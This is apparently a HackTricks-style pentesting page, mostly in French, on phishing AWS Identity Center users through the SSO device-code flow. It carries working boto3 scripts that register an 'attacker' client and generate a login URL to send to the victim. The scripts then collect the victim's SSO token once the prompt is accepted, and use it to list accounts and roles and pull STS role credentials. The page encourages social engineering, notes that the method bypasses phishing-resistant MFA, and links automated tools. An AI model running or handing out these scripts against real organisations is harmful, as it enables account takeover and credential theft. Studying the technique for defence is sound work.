# AWS - Identity Center & SSO Unauthenticated Enum

{{#include ../../../../banners/hacktricks-training.md}}

## AWS Device Code Phishing

Initialement proposé dans [**this blog post**](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/), il est possible d'envoyer un **lien** à un utilisateur utilisant AWS SSO qui, si **l'utilisateur accepte**, permettra à l'attaquant d'obtenir un **token to impersonate the user** et d'accéder à tous les **roles** auxquels l'utilisateur a accès dans l'**Identity Center**.

In order to perform this attack the requisites are:

- La victime doit utiliser **Identity Center**
- L'attaquant doit connaître le **sous-domaine** utilisé par la victime `<victimsub>.awsapps.com/start`

Rien qu'avec ces informations, **l'attaquant pourra envoyer un lien à l'utilisateur** qui, s'il est **accepté**, donnera **à l'attaquant l'accès au compte utilisateur AWS**.

### Attaque

1. **Trouver le sous-domaine**

La première étape pour l'attaquant est de découvrir le sous-domaine que l'entreprise victime utilise dans son Identity Center. Cela peut se faire via **OSINT** ou **guessing + BF**, car la plupart des entreprises utilisent leur nom ou une variation de celui-ci.

Avec ces informations, il est possible d'obtenir la région dans laquelle Identity Center a été configuré :
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **Générez le lien pour la victime & envoyez-le**

Exécutez le code suivant pour générer un lien de connexion AWS SSO afin que la victime puisse s'authentifier.\
Pour la démo, exécutez ce code dans une console python et ne la quittez pas car plus tard vous aurez besoin de certains objets pour obtenir le token:
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
Envoyez le lien généré à la victime en utilisant vos formidables compétences en ingénierie sociale !

3. **Attendez que la victime l'accepte**

Si la victime était **déjà connectée à AWS**, elle devra simplement accepter d'accorder les permissions ; si ce n'était pas le cas, elle devra **se connecter puis accepter d'accorder les permissions**.\
C'est à quoi ressemble l'invite de nos jours :

<figure><img src="../../../images/image (343).png" alt="" width="311"><figcaption></figcaption></figure>

4. **Obtenir un access token SSO**

Si la victime a accepté l'invite, exécutez ce code pour **générer un SSO token en vous faisant passer pour l'utilisateur** :
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
Le token d'accès SSO est **valide pendant 8h**.

5. **Se faire passer pour l'utilisateur**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### Phishing de l'unphisable MFA

C'est intéressant de savoir que l'attaque précédente **fonctionne même si un "unphisable MFA" (webAuth) est utilisé**. Cela s'explique parce que le précédent **workflow ne quitte jamais le domaine OAuth utilisé**. Contrairement à d'autres attaques de phishing où l'utilisateur doit usurper le domaine de connexion, dans ce cas le device code workflow est préparé de sorte qu'un **code est connu par un device** et l'utilisateur peut se connecter même depuis une machine différente. Si l'invite est acceptée, le device, simplement en **connaissant le code initial**, pourra **récupérer les credentials** de l'utilisateur.

Pour plus d'infos à ce sujet, [**consultez cet article**](https://mjg59.dreamwidth.org/62175.html).

### Outils automatiques

- [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
- [https://github.com/sebastian-mora/awsssome_phish](https://github.com/sebastian-mora/awsssome_phish)

## Références

- [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
- [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
- [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
- [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

{{#include ../../../../banners/hacktricks-training.md}}
